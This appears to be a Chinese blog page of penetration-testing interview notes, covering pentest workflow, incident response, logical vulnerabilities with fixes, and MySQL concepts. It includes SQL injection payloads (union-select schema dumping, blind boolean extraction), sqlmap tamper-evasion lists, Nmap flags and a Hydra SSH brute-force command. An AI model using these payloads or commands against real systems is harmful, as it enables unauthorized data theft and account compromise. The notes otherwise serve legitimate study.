href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%B3%A8%E5%85%A5%E4%B9%8Bflask%E6%A1%86%E6%9E%B6%E4%B8%AD%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E9%97%AE%E9%A2%98">服务端注入之Flask框架中服务端模板注入问题</a></li></ul></li><li><a href="#http%E5%8D%8F%E8%AE%AE">HTTP协议</a><ul><li><a href="#tcp%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B">TCP三次握手四次挥手</a><ul><li><a href="#%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B">三次握手</a></li><li><a href="#%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B">四次挥手</a></li></ul></li><li><a href="#%E5%9B%9B%E5%B1%82%E6%A8%A1%E5%9E%8B">四层模型</a></li><li><a href="#%E5%BD%93%E4%BD%A0%E8%BE%93%E5%85%A5%E4%B8%80%E4%B8%AA%E7%BD%91%E5%9D%80%E7%82%B9%E5%87%BB%E8%AE%BF%E9%97%AE%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%80%E4%B9%88">当你输入一个网址，点击访问，会发生什么？</a><ul><li><a href="#%E6%9F%A5%E6%89%BEdns%E8%AE%B0%E5%BD%95">查找DNS记录</a></li><li><a href="#%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5">建立连接</a></li></ul></li><li><a href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%8A%B6%E6%80%81%E7%A0%81">常见的状态码</a></li><li><a href="#osi%E4%B8%83%E5%B1%82">OSI七层</a><ul><li><a href="#osi%E5%9B%9B%E5%B1%82">OSI四层</a></li></ul></li></ul></li><li><a href="#%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE">路由协议</a><ul><li><a href="#%E4%BD%A0%E6%90%AD%E5%BB%BA%E8%BF%87%E7%9A%84%E6%9C%80%E5%A4%8D%E6%9D%82%E7%9A%84%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%98%AF%E4%BB%80%E4%B9%88">你搭建过的最复杂的网络设备是什么</a></li><li><a href="#%E4%BD%BF%E7%94%A8%E8%BF%87%E4%BB%80%E4%B9%88%E7%A1%AC%E4%BB%B6%E8%AE%BE%E5%A4%87">使用过什么硬件设备</a></li></ul></li><li><a href="#linux%E8%BF%90%E7%BB%B4">Linux运维</a><ul><li><a href="#%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B">启动过程</a></li><li><a href="#linux%E5%9F%BA%E7%BA%BF%E8%A7%84%E8%8C%83">Linux基线规范</a><ul><li><a href="#%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86%E5%92%8C%E6%8E%88%E6%9D%83">账号管理和授权</a></li><li><a href="#%E6%9C%8D%E5%8A%A1">服务</a></li><li><a href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">文件系统</a></li><li><a href="#%E6%97%A5%E5%BF%97">日志</a></li><li><a href="#ip%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E8%A6%81%E6%B1%82">IP协议安全要求</a></li></ul></li><li><a href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%9F%BA%E7%BA%BF%E8%A7%84%E8%8C%83apache">中间件基线规范（APACHE）</a><ul><li><a href="#%E9%85%8D%E7%BD%AE">配置</a></li><li><a href="#%E7%A6%81%E6%AD%A2">禁止</a></li><li><a href="#%E9%9A%90%E8%97%8F">隐藏</a></li><li><a href="#%E5%88%A0%E9%99%A4">删除</a></li></ul></li><li><a href="#webshell%E6%A3%80%E6%B5%8B%E6%80%9D%E8%B7%AF">webshell检测思路</a><ul><li><a href="#%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B">静态检测</a></li><li><a href="#%E5%8A%A8%E6%80%81%E6%A3%80%E6%B5%8B">动态检测</a></li><li><a href="#%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8B">日志检测</a></li><li><a href="#%E8%AF%AD%E6%B3%95%E6%A3%80%E6%B5%8B">语法检测</a></li><li><a href="#%E7%BB%9F%E8%AE%A1%E5%AD%A6%E6%A3%80%E6%B5%8B">统计学检测</a></li><li><a href="#%E9%98%B2%E8%8C%83webshell">防范webshell</a></li></ul></li><li><a href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">计划任务</a></li><li><a href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%90%E7%BB%B4%E7%BC%96%E5%86%99%E8%BF%87%E4%BB%80%E4%B9%88%E8%84%9A%E6%9C%AC">自动化运维编写过什么脚本</a></li><li><a href="#yum%E7%94%A8%E7%9A%84%E4%BB%80%E4%B9%88%E6%BA%90%E6%9C%AC%E5%9C%B0%E8%87%AA%E6%90%AD%E6%8C%82%E8%BD%BD">yum用的什么源（本地自搭，挂载）</a></li><li><a href="#awk-sed%E7%9A%84%E4%BD%BF%E7%94%A8">awk sed的使用</a></li><li><a href="#%E6%8E%92%E9%94%99%E6%80%9D%E8%B7%AF%E6%8E%92%E9%94%99%E7%BB%8F%E9%AA%8C">排错思路，排错经验</a></li><li><a href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90elk%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E5%88%86%E6%9E%90">日志分析ELK的使用和分析</a><ul><li><a href="#%E4%BA%8B%E4%BB%B6%E5%8F%91%E7%94%9F%E7%9A%84%E5%88%86%E6%9E%90">事件发生的分析</a></li></ul></li><li><a href="#%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E4%BF%AE%E6%94%B9">用户权限管理(修改)</a></li><li><a href="#%E9%98%B2%E7%81%AB%E5%A2%99">防火墙</a></li><li><a href="#ipsec-vpn">IPsec VPN</a></li><li><a href="#%E5%AE%89%E5%85%A8%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7">安全监控工具</a></li><li><a href="#linux%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80">Linux木马查杀</a></li><li><a href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E8%AE%BE%E5%A4%87%E6%9C%89%E5%95%A5">常见的设备有啥</a></li></ul></li><li><a href="#windows%E8%BF%90%E7%BB%B4">Windows运维</a><ul><li><a href="#%E5%9F%BA%E7%BA%BF%E8%A7%84%E8%8C%83">基线规范</a></li><li><a href="#%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80">木马查杀</a></li><li><a href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-1">计划任务</a></li></ul></li><li><a href="#iso27000%E5%92%8C%E7%AD%89%E4%BF%9D%E9%87%8D%E7%82%B9%E7%AD%89%E4%BF%9D">ISO27000和等保(重点等保)</a><ul><li><a href="#%E8%AF%B4%E4%B8%80%E4%B8%8Biso27000">说一下ISO27000</a></li><li><a href="#%E8%AF%B4%E4%B8%80%E4%B8%8B%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E5%88%B6%E5%BA%A6">说一下等级保护制度</a></li><li><a href="#%E5%B7%AE%E5%BC%82">差异</a></li><li><a href="#%E5%85%B1%E6%80%A7">共性</a></li></ul></li><li><a href="#%E7%AE%97%E6%B3%95">算法</a><ul><li><a href="#%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E5%BF%AB%E6%8E%92-%E4%BA%8C%E5%88%86-%E5%86%92%E6%B3%A1">排序算法：快排 二分 冒泡</a></li></ul></li><li><a href="#ldap%E6%B3%A8%E5%85%A5">LDAP注入</a></li></ul></li></ul><blockquote><p><a href="https://zhuanlan.zhihu.com/p/25582026" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25582026</a></p></blockquote><blockquote><p>给你一个网站你是如何来<em>渗透测试</em>的? - 杨文的文章 - 知乎 <a href="http://zhuanlan.zhihu.com/p/25605198" target="_blank" rel="noopener">http://zhuanlan.zhihu.com/p/25605198</a></p></blockquote><h1>技术面试问题</h1><h2 id="CTF">CTF</h2><h3 id="说一个印象深刻的CTF的题目">说一个印象深刻的CTF的题目</h3><ul><li>Padding Oracle-&gt;CBC-&gt;密码学(RSA/AES/DSA/SM)</li><li>CRC32</li><li>反序列化漏洞</li></ul><h4 id="sql二次注入">sql二次注入</h4><p>第一次进行数据库插入数据的时候，仅仅只是使用了 <code>addslashes</code> 或者是借助 <code>get_magic_quotes_gpc</code> 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。<br>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p><p>交友网站，填写年龄处是一个注入点，页面会显示出与你相同年龄的用户有几个。使用and 1=1确定注入点，用order by探测列数，union select探测输出点是第几列，</p><ol><li>暴库 <code>group_concat(schema_name) from information_schema.schemata</code></li><li>暴表 <code>group_concat(table_name) from information_schema.schemata where table_schema='hhh'</code></li><li>获取数据 <code>concat(flag) from flag</code></li></ol><p>修复：在从数据库或文件中取数据的时候，也要进行转义或者过滤。</p><h2 id="Python">Python</h2><h3 id="爬虫模块、框架、反爬虫机制（IP-代理池、验证码破解、UA）">爬虫模块、框架、反爬虫机制（IP-&gt;代理池、验证码破解、UA）</h3><h3 id="并发-多线程、线程池、协程、三个程之间的区别">并发(多线程、线程池、协程、三个程之间的区别)</h3><p>进程是cpu资源分配的最小单位，线程是cpu调度的最小单位。以前进程既是资源分配也是调度的最小单位，后来为了更合理的使用cpu(实际上是cpu性能越来越好)，才将资源分配和调度分开，就有了线程。线程是建立在进程的基础上的一次程序运行单位。</p><h3 id="常用的标准库">常用的标准库</h3><ul><li><h2 id="functools">functools</h2></li><li>itertools 迭代器<ul><li>count/cycle/repeat</li><li>chain</li><li>groupby 把迭代器中相邻的重复元素挑出来放在一起</li></ul></li><li>concurrent.futures<ul><li>ThreadPoolExecutor</li></ul></li><li>hashlib<ul><li>md5</li><li>sha1</li><li>sha256</li><li>sha512</li></ul></li><li>logging</li><li>sys.argv argparse读取命令行参数</li><li>pickle 序列化工具</li><li>re 正则</li><li>collections 多种数据类型<ul><li>namedtuple</li><li>OrderedDict</li><li>Counter</li></ul></li><li>os 系统相关的函数</li></ul><h3 id="DJANGO和FLASK区别和使用">DJANGO和FLASK区别和使用</h3><h3 id="ORM">ORM</h3><h3 id="python安全工具编写-源码阅读">python安全工具编写/源码阅读</h3><h3 id="证明能力">证明能力</h3><ul><li>python安全工具开发</li><li>python项目，记一下技术细节</li></ul><h2 id="密码学">密码学</h2><h3 id="RSA">RSA</h3><h3 id="DES">DES</h3><h3 id="AES">AES</h3><h3 id="国内SM系列">国内SM系列</h3><h2 id="风险评估">风险评估</h2><h3 id="流程">流程</h3><p><img src="https://i.loli.net/2018/03/09/5aa223dbc8662.jpg" alt></p><h3 id="三要素">三要素</h3><ul><li>资产：资产价值</li><li>威胁：威胁主体、影响对象、出现频率、动机等</li><li>脆弱性：资产弱点的严重程度‘</li></ul><h2 id="代码审计">代码审计</h2><h3 id="Fority-SCA审计JAVA代码">Fority SCA审计JAVA代码</h3><p>fortify用到什么模块? 过滤器 自定义规则 生成报告</p><h3 id="Seay审计PHP代码">Seay审计PHP代码</h3><h3 id="源码阅读">源码阅读</h3><h2 id="应急响应具体流程">应急响应具体流程</h2><h3 id="模型">模型</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/26542790" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26542790</a></p></blockquote><p>PDCERF模型</p><ul><li>Prepare（准备）：准备用来检测的工具和人</li><li>Detection（检测）：紧急事件监测：包括防火墙、系统、web服务器、IDS/WAF/SIEM中的日志，不正常或者是执行了越权操作的用户，甚至还有管理员的报告</li><li>Containment（抑制）：首先先控制受害范围，不要让攻击的影响继续蔓延到其他的IT资产和业务环境，切记不要直接一股脑的投入全部精力到封堵后门。紧接着要做的是去寻找根源原因，彻底解决，封堵攻击源，把业务恢复到更张水平</li><li>Eradication（根除）</li><li>Recover（恢复）</li><li>Follow-Up（跟踪）：根据各种监控去确定没有其他的攻击行为和攻击向量，紧接着就是开会反省此次事件，写报告，持续改进工作流程和工作缓解</li></ul><h3 id="实例">实例</h3><h4 id="DDOS">DDOS</h4><h5 id="DDOS是什么">DDOS是什么</h5><p>分布式拒绝服务攻击（DDoS）是目前黑客经常采用而难以防范的攻击手段。DoS的攻击方式有很多种，最基本的DoS攻击就是利用合理的服务请求来占用过多的服务资源，从而使合法用户无法得到服务的响应。</p><p>DDOS攻击手段是在传统的DOS攻击基础之上产生的一类攻击方式。单一的DOS攻击一般是采用一对一方式的，当攻击目标CPU速度低、内存小或者网络带宽小等等各项性能指标不高它的效果是明显的。随着计算机与网络技术的发展，计算机的处理能力迅速增长，内存大大增加，同时也出现了千兆级别的网络，这使得DOS攻击的困难程度加大了——目标对恶意攻击包的“消化能力”加强了不少，例如你的攻击软件每秒钟可以发送3,000个攻击包，但我的主机与网络带宽每秒钟可以处理10,000个攻击包，这样一来攻击就不会产生什么效果这时侯分布式的拒绝服务攻击手段（DDOS）就应运而生了。</p><p>如果说计算机与网络的处理能力加大了10倍，用一台攻击机来攻击不再能起作用的话，攻击者使用10台攻击机同时攻击呢？用100台呢？DDOS就是利用更多的傀儡机来发起进攻，以比从前更大的规模来进攻受害者。通常，被攻击的服务器有以下症状：1、被攻击主机上有大量等待的TCP连接；2、网络中充斥着大量的无用的数据包，源地址为假；3、制造高流量无用数据，造成网络拥塞，使受害主机无法正常和外界通讯；4、利用受害主机提供的服务或传输协议上的缺陷，反复高速的发出特定的服务请求，使受害主机无法及时处理所有正常请求；5、严重时会造成系统死机</p><h4 id="实例-2">实例</h4><p>我司网站www.catroot.cn的IP  223.223.223.223 被人DDOS攻击，流量达9G，并且机房流量清洗无效，所以把223.223.223.223封停，导致网站不能访问，请作出紧急预案。</p><blockquote><p><a href="https://www.zhihu.com/question/19581905" target="_blank" rel="noopener">https://www.zhihu.com/question/19581905</a></p></blockquote><ul><li>网络设备设施<ul><li>拼带宽，加大带宽，但是成本太高</li><li>使用硬件防火墙</li><li>选用高性能设备</li></ul></li><li>抗D思想和方案<ul><li>负载均衡</li><li>花钱买流量清洗服务</li><li>CDN：web层，比如cc攻击</li><li>分布式集群防御</li><li>高防：防大部分攻击，udp、大型的cc攻击</li></ul></li><li>预防为主<ul><li>系统漏洞</li><li>系统资源优化：</li><li>过滤不必要的服务和端口</li><li>限制特定流量：检查访问来源做适当限制</li></ul></li></ul><h4 id="主机被入侵">主机被入侵</h4><ol><li>优先提取易消失的数据<ul><li>内存信息 <code>free -m</code> `htop</li><li>系统进程 <code>ps top netstat ss</code></li><li>路由信息 <code>tracert</code></li></ul></li><li><code>ifconfig</code>查看网卡流量，检查网卡的发送、接收数据情况</li><li><code>NetHogs</code>实时监控带宽占用状况</li><li>查看Linux系统日志 <code>/var/log</code></li><li><code>ClamAV</code>杀毒软件</li></ol><h2 id="渗透测试流程相关">渗透测试流程相关</h2><h3 id="渗透测试流程-2">渗透测试流程</h3><ol><li>项目访谈</li><li>信息收集：whois、网站源IP、旁站、C段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息</li><li>漏洞扫描：Nessus, AWVS</li><li>手动挖掘：逻辑漏洞</li><li>验证漏洞</li><li>修复建议</li><li>（如果有）基线检查/复验漏洞</li><li>输出报告<ul><li>概述</li><li>测试基本信息<ul><li>测试范围</li><li>测试时间</li><li>测试任务</li><li>测试过程</li></ul></li><li>信息安全风险综合分析<ul><li>整体风险分析</li><li>风险影响分析</li><li>系统安全分析</li><li>安全漏洞列表</li></ul></li><li>解决方案建议</li><li>复测报告</li></ul></li></ol><h3 id="渗透测试项目">渗透测试项目</h3><p>用七八句话概括一下发现、验证漏洞细节、扮演角色、具体工作。<br>如果技术人员有兴趣会继续问，接着再引导到别处，让自己多说说细节。</p><h3 id="渗透测试具体实施">渗透测试具体实施</h3><h3 id="17年OWASP-TOP10">17年OWASP TOP10</h3><ul><li>注入:sql,nosql,ldap,os</li><li>失效的身份认证:</li><li>敏感信息泄漏</li><li>XXE XML外部实体</li><li>失效的访问控制：管理页面仅能管理员权限访问；越权漏洞</li><li>安全配置错误：页面错误信息，默认密码，使用已知漏洞的应用</li><li>XSS</li><li>不安全的反序列化：一个PHP论坛使用PHP对象序列化来保存一个cookie，用户修改cookie即可伪造管理员登陆</li><li>使用含有已知漏洞的组件：比如structs2框架</li><li>不足的日志记录和监控：代码被删除，无法溯源；记录登陆失败次数；监控问题没被管理员响应</li></ul><h3 id="常见的Web安全漏洞">常见的Web安全漏洞</h3><ul><li>SQL注入</li><li>XSS</li><li>文件遍历、文件上传、文件下载</li><li>垂直越权、水平越权</li><li>逻辑漏洞</li></ul><h3 id="挖过什么逻辑漏洞">挖过什么逻辑漏洞</h3><h4 id="订单任意金额修改">订单任意金额修改</h4><p>相同价格增加订单数量，相同订单数量减少产品价格，订单价格设定为负数。</p><p>预防思路：</p><ul><li>订单需要多重效验<br><img src="http://image.3001.net/images/20160819/14715932566558.png" alt></li><li>订单数值较大的时候需要人工审核</li></ul><h4 id="验证码回传">验证码回传</h4><p>漏洞一般发生在账号密码找回、账号注册、支付订单等。验证码发送途径一般为手机短信、邮箱邮件</p><p>预防思路：</p><ul><li>response数据内不包含验证码，验证方式主要采取后端验证，但是缺点是服务器的运算压力也会随之增加</li><li>如果要进行前端验证的话也可以，但是需要进行加密</li></ul><h4 id="未进行登陆凭证验证">未进行登陆凭证验证</h4><p>有些业务的接口，因为缺少了对用户的登陆凭证的效验或者是验证存在缺陷，导致黑客可以未经授权访问这些敏感信息甚至是越权操作。比如后台页面、订单ID枚举、敏感信息可下载、没验证ID或cookie验证导致越权。</p><p>预防思路：</p><ul><li>对敏感数据存在的接口和页面做cookie，ssid，token或者其它验证</li></ul><h4 id="接口无限制枚举">接口无限制枚举</h4><ul><li>某电商登陆接口无验证导致撞库</li><li>某招聘网验证码无限制枚举</li><li>某快递公司优惠券枚举</li><li>某电商会员卡卡号枚举</li></ul><p>预防思路：</p><ul><li><p>在输入接口设置验证，如token，验证码等。如果设定验证码，最好不要单纯的采取一个前端验证，最好选择后端验证。如果设定token，请确保每个token只能采用一次，并且对token设定时间参数。</p></li><li><p>注册界面的接口不要返回太多敏感信息，以防遭到黑客制作枚举字典。</p></li><li><p>验证码不要用短数字，尽量6位以上，最好是以字母加数字进行组合，并且验证码需要设定时间期限。</p></li><li><p>优惠券，VIP卡号请尽量不要存在规律性和简短性，并且优惠券最好是以数字加字母进行组合。</p></li></ul><h4 id="cookie设置存在缺陷">cookie设置存在缺陷</h4><ul><li>Cookie的效验值过于简单。有些web对于cookie的生成过于单一或者简单，导致黑客可以对cookie的效验值进行一个枚举.</li><li>cookie存在被盗风险，即用户重置密码后使用老cookie依然可以通过验证</li><li>用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。不能采取简单的base64等算法</li><li>越权：平行越权：权限类型不变，权限ID改变；垂直越权：权限ID不变，权限类型改变；交叉越权：即改变ID，也改变权限</li></ul><p>预防思路</p><ol><li>cookie中设定多个验证，比如自如APP的cookie中，需要sign和ssid两个参数配对，才能返回数据。</li><li>用户的cookie数据加密应严格使用标准加密算法，并注意密钥管理。</li><li>用户的cookie的生成过程中最好带入用户的密码，一旦密码改变，cookie的值也会改变。</li><li>cookie中设定session参数，以防cookie可以长时间生效。</li><li>根据业务不同还有很多方法</li></ol><h3 id="找回密码功能缺陷">找回密码功能缺陷</h3><ol start="2"><li>单纯读取内存值作为用户凭证</li><li>电商系统加车、下单漏洞</li></ol><h3 id="你常用的渗透工具有哪些，最常用的是哪个？">你常用的渗透工具有哪些，最常用的是哪个？</h3><h4 id="扫描-Nessus-AWVS-Nikto">扫描:Nessus,AWVS,Nikto</h4><h4 id="SQLmap">SQLmap</h4><blockquote><p><a href="https://blog.csdn.net/ski_12/article/details/58188331" target="_blank" rel="noopener">https://blog.csdn.net/ski_12/article/details/58188331</a></p></blockquote><p>常用参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-u 单个URL -m xx.txt 多个URL</span><br><span class="line">-d &quot;mysql://user:password@10.10.10.137:3306/dvwa&quot;  作为服务器客户端，直接连接数据库</span><br><span class="line">--data post/get都适用</span><br><span class="line">-p 指定扫描的参数</span><br><span class="line">-r 读取文件</span><br><span class="line">-f 指纹信息</span><br><span class="line">--tamper 混淆脚本，用于应用层过滤</span><br><span class="line">--cookie --user-agent --host等等http头的修改</span><br><span class="line">--threads 并发线程 默认为1</span><br><span class="line">--dbms MySQL&lt;5.0&gt; 指定数据库或版本</span><br><span class="line"></span><br><span class="line">–level=LEVEL 执行测试的等级（1-5，默认为 1）</span><br><span class="line">–risk=RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险</span><br><span class="line">–current-db / 获取当前数据库名称</span><br><span class="line">–dbs 枚举数据库管理系统数据库</span><br><span class="line">–tables 枚举 DBMS 数据库中的表</span><br><span class="line">–columns 枚举 DBMS 数据库表列</span><br><span class="line">-D DB 要进行枚举的数据库名</span><br><span class="line">-T TBL 要进行枚举的数据库表</span><br><span class="line">-C COL 要进行枚举的数据库列</span><br><span class="line">-U USER 用来进行枚举的数据库用户</span><br></pre></td></tr></table></figure><p>常用的tamper</p><blockquote><p>本地：sqlmap-tamper分类.xlsx</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">base64encode.py #转为b64编码</span><br><span class="line">charencode.py url编码</span><br><span class="line">chardoubleencode.py 双URL编码</span><br><span class="line">unmagicquotes.py 宽字节</span><br><span class="line">randomcomments.py 用/**/分割SQL关键字</span><br><span class="line">space2plus.py space2comment.py space2xxxx.py 替换空格为xx</span><br></pre></td></tr></table></figure><h4 id="Nmap">Nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nmap hostname/ip或者多个ip或者子网192.168.123.*</span><br><span class="line">-iL ip.txt 扫描ip.txt的所有ip</span><br><span class="line">-A 包含了-sV，-O，探测操作系统信息和路由跟踪。一般不用，是激烈扫描</span><br><span class="line">-O 探测操作系统信息</span><br><span class="line">-sV 查找主机服务版本号</span><br><span class="line">-sA 探测该主机是否使用了包过滤器或防火墙</span><br><span class="line">-sS 半开扫描，一般不会记入日志，不过需要root权限。</span><br><span class="line">-sT TCP connect()扫描，这种方式会在目标主机的日志中记录大批的链接请求以及错误信息。</span><br><span class="line">-sP ping扫描，加上这个参数会使用ping扫描，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping，却实际存在。</span><br><span class="line">-sN TCP空扫描</span><br><span class="line">-F 快速扫描</span><br><span class="line">-Pn 扫描之前不使用ping，适用于防火墙禁止ping，比较有用。</span><br><span class="line">-p 指定端口/端口范围</span><br><span class="line">-oN 将报告写入文件</span><br><span class="line">-v 详细信息</span><br><span class="line">-T&lt;0-5&gt; 设定速度</span><br></pre></td></tr></table></figure><p>Nmap还可以用到爆破等一些脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--script all 使用所有脚本</span><br><span class="line">--script=sql.injection.nse sql注入</span><br><span class="line">--script=&quot;smb*&quot;  扫smb系列</span><br></pre></td></tr></table></figure><h4 id="Metasploit">Metasploit</h4><p>使用内置模块。HR：常用的模块有哪些？<br>tcp反向链接 msfvenom</p><h4 id="Hydra">Hydra</h4><p>密码爆破工具，FTP，MSSQL，MYSQL，POP3，SSH，rdp，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">hydra IP -l loginname -P pass.txt PROTROCL</span><br><span class="line">hydra 127.0.0.1 -l root -P pass.txt ssh</span><br></pre></td></tr></table></figure><h4 id="kali信息收集工具">kali信息收集工具</h4><ul><li>dig</li><li>whois</li><li>host:查询dns服务器</li><li>nslookup</li><li>域名枚举：fierse -dns</li><li>maltego</li><li>onesixtyone</li></ul><h4 id="流量分析WireShark">流量分析WireShark</h4><p>CTF</p><h3 id="描述一个你深入研究过的CVE或POC-ms17-010-最新的CVE">描述一个你深入研究过的CVE或POC(ms17-010/最新的CVE)</h3><h2 id="数据库注入">数据库注入</h2><blockquote><p><a href="https://www.zhihu.com/question/22953267" target="_blank" rel="noopener">https://www.zhihu.com/question/22953267</a></p></blockquote><h3 id="MySQL面试题">MySQL面试题</h3><h4 id="MySQL存储引擎？">MySQL存储引擎？</h4><ol><li>InnoDB：主流的存储引擎。支持事务、支持行锁、支持非锁定读、支持外键约束</li></ol><ul><li>为MySQL提供了具有提交、回滚和崩溃恢复能力的事物安全（ACID兼容）存储引擎。InnoDB锁定在行级并且也在 SELECT语句中提供一个类似Oracle的非锁定读。这些功能增加了多用户部署和性能。在SQL查询中，可以自由地将InnoDB类型的表和其他MySQL的表类型混合起来，甚至在同一个查询中也可以混合</li><li>InnoDB存储引擎为在主内存中缓存数据和索引而维持它自己的缓冲池。InnoDB将它的表和索引在一个逻辑表空间中，表空间可以包含数个文件（或原始磁盘文件）。这与MyISAM表不同，比如在MyISAM表中每个表被存放在分离的文件中。InnoDB表可以是任何尺寸，即使在文 件尺寸被限制为2GB的操作系统上</li><li>InnoDB支持外键完整性约束，存储表中的数据时，每张表的存储都按主键顺序存放，如果没有显示在表定义时指定主键，InnoDB会为每一行生成一个6字节的ROWID，并以此作为主键</li></ul><ol start="2"><li>MyISAM：访问速度快，不支持事务，逐渐被淘汰</li><li>MEMORY：BTREE索引或者HASH索引。将表中数据放在内存中，并发性能差。<code>information_schema</code>用的是该引擎</li><li>MERGE、Archive等等不常用的</li></ol><h4 id="什么是事务？">什么是事务？</h4><p>事务是一组原子性的SQL语句或者说是一个独立的工作单元，如果数据库引擎能够成功对数据库应用这组SQL语句，那么就执行，如果其中有任何一条语句因为崩溃或其它原因无法执行，那么所有的语句都不会执行。也就是说，事务内的语句，要么全部执行成功，要么全部执行失败。<br>举个银行应用的典型例子：</p><p>假设银行的数据库有两张表：支票表和储蓄表，现在某个客户A要从其支票账户转移2000元到其储蓄账户，那么至少需求三个步骤：</p><p>a.检查A的支票账户余额高于2000元；</p><p>b.从A的支票账户余额中减去2000元；</p><p>c.在A的储蓄账户余额中增加2000元。</p><p>这三个步骤必须要打包在一个事务中，任何一个步骤失败，则必须要回滚所有的步骤，否则A作为银行的客户就可能要莫名损失2000元，就出问题了。这就是一个典型的事务，这个事务是不可分割的最小工作单元，整个事务中的所有操作要么全部提交成功，要么全部失败回滚，不可能只执行其中一部分，这也是事务的原子性特征。</p><h4 id="读锁和写锁">读锁和写锁</h4><p>读锁是共享的，即相互不阻塞的，多个客户在同一时刻可以读取同一资源，互不干扰。写锁是排他的，即一个写锁会阻塞其它的写锁和读锁，只有这样，才能确保给定时间内，只有一个用户能执行写入，防止其它用户读取正在写入的同一资源。写锁优先级高于读锁。</p><h4 id="MySQL的索引">MySQL的索引</h4><p>索引是帮助MySQL高效获取数据的数据结构。MYISAM和InnoDB存储引擎只支持BTree索引；MEMORY和HEAP储存引擎可以支持HASH和BTREE索引。</p><h4 id="ORDER-BY在注入的运用">ORDER BY在注入的运用</h4><h4 id="GPC是什么？GPC之后怎么绕过？">GPC是什么？GPC之后怎么绕过？</h4><p>如果<code>magic_quotes_gpc=On</code>，PHP解析器就会自动为post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符（认为是php的字符）引起的污染。</p><h4 id="Mysql一个-和两个-什么区别-2">Mysql一个@和两个@什么区别</h4><ul><li>@为用户变量，使用<code>SET @var1=1</code>赋值</li><li>@@ 为系统变量 ，包括全局变量<code>show global variables \G;</code>和会话变量<code>show session variables \G;</code></li></ul><h4 id="注入-绕过常用的函数">注入/绕过常用的函数</h4><ol><li>基于布尔SQL盲注<ul><li><code>left(database(),1)&gt;'s'</code></li><li><code>ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+</code></li><li><code>ascii(substr((select database()),1,1))=98</code></li><li><code>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23</code></li><li><code>regexp</code>正则注入 <code>select user() regexp '^[a-z]';</code></li><li><code>select user() like 'ro%'</code></li></ul></li><li>基于报错的SQL盲注<ul><li><code>Select 1,count(*),concat(0x3a,0x3a,(select 